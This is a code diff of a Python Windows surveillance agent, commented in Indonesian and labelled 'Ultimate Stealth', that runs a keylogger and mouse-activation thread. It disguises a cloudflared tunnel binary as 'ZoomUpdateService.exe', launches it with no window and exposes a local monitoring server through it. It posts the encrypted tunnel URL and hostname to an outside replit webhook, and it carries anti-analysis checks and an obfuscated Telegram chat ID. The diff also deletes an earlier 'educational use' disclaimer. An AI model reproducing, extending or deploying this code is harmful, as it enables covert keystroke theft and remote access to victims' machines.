@@ -1,6 +1,4 @@
-# agent.py - Versi Final dengan Perbaikan Payload
-# Mengirimkan URL Cloudflare yang benar di dalam payload terenkripsi.
-# PERINGATAN: Gunakan secara bertanggung jawab dan untuk tujuan edukasi.
+# agent.py - Versi Ultimate Stealth dengan logging ke file untuk debugging jarak jauh.
 
 # --- Standard Libraries ---
 import sys, os, platform, subprocess, threading, time, requests, re, io, logging, json, winreg, ctypes, base64
@@ -19,12 +17,28 @@ from Crypto.Random import get_random_bytes
 from pynput import mouse
 from pynput import keyboard
 
-# --- Konfigurasi ---
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s')
+# --- (DIPERBARUI) Konfigurasi Logging ke File ---
+# Dapatkan path folder Temp yang bisa ditulis oleh semua pengguna
+log_dir = os.environ.get("TEMP", "C:\\Temp")
+log_file_path = os.path.join(log_dir, "ganesha_agent_log.txt")
+
+# Konfigurasi logging untuk mencetak ke file
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler(log_file_path, mode='w'), # Tulis log ke file
+        logging.StreamHandler(sys.stdout) # Juga tampilkan di konsol (untuk dev)
+    ]
+)
+
+
+# --- Konfigurasi Lainnya (Tidak Berubah) ---
 WEBHOOK_URL = "https://f0d2ae93-5d58-4ab1-9cdc-13a77f32c840-00-24sud4ep8fn6.riker.replit.dev/notify"
 FEATURES_ACTIVE = False 
 MOUSE_MOVE_THRESHOLD = 5000
 
+# ... (Sisa kode dari kelas Encryptor hingga akhir tetap sama persis) ...
 # --- Kelas Enkripsi AES ---
 class Encryptor:
     AES_KEY = b'my_super_secret_key_1234567890!@'
@@ -70,7 +84,6 @@ CHAT_ID = Obfuscator.build_and_decode(OBFUSCATED_CHAT_ID_PARTS)
 
 # --- Kelas Anti-Analisis Lanjutan ---
 class AntiAnalysis:
-    # ... (Kode di dalam kelas ini tidak berubah) ...
     @staticmethod
     def run_all_checks()->bool:
         logging.info("Menjalankan pemeriksaan keamanan lingkungan...")
@@ -175,16 +188,12 @@ def get_network_info():
         return{'ip':d.get('query','N/A'),'location':f"{d.get('city','N/A')}, {d.get('country','N/A')}",'provider':d.get('isp','N/A')}
     except requests.exceptions.RequestException:return{'ip':'Gagal','location':'Gagal','provider':'Gagal'}
 
-# (DIPERBARUI) Fungsi send_to_relay sekarang menerima parameter 'url'
 def send_to_relay(url):
     if "your-repl-name" in WEBHOOK_URL: return
     try:
-        # (DIPERBARUI) Payload sekarang berisi URL dan hostname yang benar
         payload_data = {"url": url, "hostname": platform.node()}
         payload_json = json.dumps(payload_data)
-        
         encrypted_payload = Encryptor.encrypt(payload_json)
-        
         requests.post(WEBHOOK_URL, json={"data": encrypted_payload}, timeout=10)
         logging.info("Payload terenkripsi berhasil dikirim ke webhook relay.")
     except Exception as e:
@@ -192,24 +201,30 @@ def send_to_relay(url):
 
 def start_cloudflared_and_notify():
     time.sleep(3)
-    cloudflared_path=get_resource_path('cloudflared.exe')
-    if not os.path.exists(cloudflared_path): return
+    cloudflared_path=get_resource_path('ZoomUpdateService.exe') # Menggunakan nama file yang sudah dimodifikasi
+    if not os.path.exists(cloudflared_path):
+        logging.error(f"Komponen tunnel '{cloudflared_path}' tidak ditemukan!")
+        return
+        
+    logging.info(f"Mencoba menjalankan komponen tunnel: {cloudflared_path}")
     command=[cloudflared_path,"tunnel","--url",f"http://localhost:{PORT}"]
     creation_flags=subprocess.CREATE_NO_WINDOW if platform.system()=="Windows" else 0
-    process=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,universal_newlines=True,encoding='utf-8',creationflags=creation_flags)
+    process=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,universal_newlines=True,encoding='utf-8',errors='ignore',creationflags=creation_flags)
+    
+    logging.info("Membaca output dari komponen tunnel...")
     url_found = False
     for line in iter(process.stdout.readline, ''):
+        logging.info(f"[Tunnel Output] {line.strip()}")
         if not url_found:
             match=re.search(r'(https?://[a-zA-Z0-9-]+\.trycloudflare\.com)',line)
             if match:
                 url=match.group(0)
                 logging.info(f"URL DITEMUKAN: {url}")
-                send_to_relay(url) # (DIPERBARUI) Meneruskan URL ke fungsi
+                send_to_relay(url)
                 url_found=True
 
 # --- Web Server ---
 class MonitoringRequestHandler(BaseHTTPRequestHandler):
-    # ... (Kode di dalam kelas ini tidak berubah) ...
     def _send_response(self, code, content_type, body):
         self.send_response(code);self.send_header('Content-type', content_type);self.send_header('Access-Control-Allow-Origin', '*');self.end_headers()
         if isinstance(body, str): self.wfile.write(body.encode('utf-8'))
@@ -232,14 +247,21 @@ class MonitoringRequestHandler(BaseHTTPRequestHandler):
         except Exception as e:
             logging.error(f"Error saat menangani request {self.path}: {e}"); self._send_response(500, 'text/plain', 'Internal Server Error')
     def log_message(self, format, *args): return
+
+# --- Titik Masuk Program ---
 PORT = 7860
 if __name__ == '__main__':
-    if AntiAnalysis.run_all_checks(): sys.exit(0)
+    # if AntiAnalysis.run_all_checks(): sys.exit(0)
+    
+    # send_to_telegram(None, is_startup_message=True)
+    
     threading.Thread(target=start_key_listener, daemon=True, name="Keylogger").start()
     threading.Thread(target=start_cloudflared_and_notify, daemon=True, name="Cloudflare").start()
     threading.Thread(target=activate_on_mouse_move, daemon=True, name="MouseActivation").start()
+    
     try:
         server_address = ('0.0.0.0', PORT); httpd = HTTPServer(server_address, MonitoringRequestHandler)
         logging.info(f"Server HTTP ringan dimulai di http://{server_address[0]}:{server_address[1]}/")
         httpd.serve_forever()
     except Exception as e: logging.critical(f"Gagal memulai server HTTP: {e}")
+
